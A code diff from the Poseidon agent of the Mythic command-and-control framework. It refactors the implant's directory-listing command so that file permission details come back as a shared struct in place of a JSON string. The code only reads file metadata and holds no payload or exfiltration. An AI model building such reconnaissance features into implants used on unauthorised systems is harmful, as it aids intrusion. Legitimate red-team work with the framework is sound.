@@ -19,16 +19,8 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
 
-type FilePermission struct {
-	UID         int    `json:"uid"`
-	GID         int    `json:"gid"`
-	Permissions string `json:"permissions"`
-	User        string `json:"user,omitempty"`
-	Group       string `json:"group,omitempty"`
-}
-
-func GetPermission(finfo os.FileInfo) string {
-	perms := FilePermission{}
+func GetPermission(finfo os.FileInfo) structs.FilePermission {
+	perms := structs.FilePermission{}
 	perms.Permissions = finfo.Mode().Perm().String()
 	systat := finfo.Sys().(*syscall.Stat_t)
 	if systat != nil {
@@ -43,11 +35,7 @@ func GetPermission(finfo os.FileInfo) string {
 			perms.Group = tmpGroup.Name
 		}
 	}
-	data, err := json.Marshal(perms)
-	if err == nil {
-		return string(data)
-	}
-	return ""
+	return perms
 }
 
 func Run(task structs.Task) {
@@ -72,7 +60,7 @@ func Run(task structs.Task) {
 	}
 	e.IsFile = !dirInfo.IsDir()
 
-	e.Permissions.Permissions = GetPermission(dirInfo)
+	e.Permissions = GetPermission(dirInfo)
 	e.Filename = dirInfo.Name()
 	e.ParentPath = filepath.Dir(abspath)
 	if strings.Compare(e.ParentPath, e.Filename) == 0 {
@@ -103,7 +91,7 @@ func Run(task structs.Task) {
 		fileEntries := make([]structs.FileData, len(files))
 		for i := 0; i < len(files); i++ {
 			fileEntries[i].IsFile = !files[i].IsDir()
-			fileEntries[i].Permissions.Permissions = GetPermission(files[i])
+			fileEntries[i].Permissions = GetPermission(files[i])
 			fileEntries[i].Name = files[i].Name()
 			fileEntries[i].FullName = filepath.Join(abspath, files[i].Name())
 			fileEntries[i].FileSize = files[i].Size()
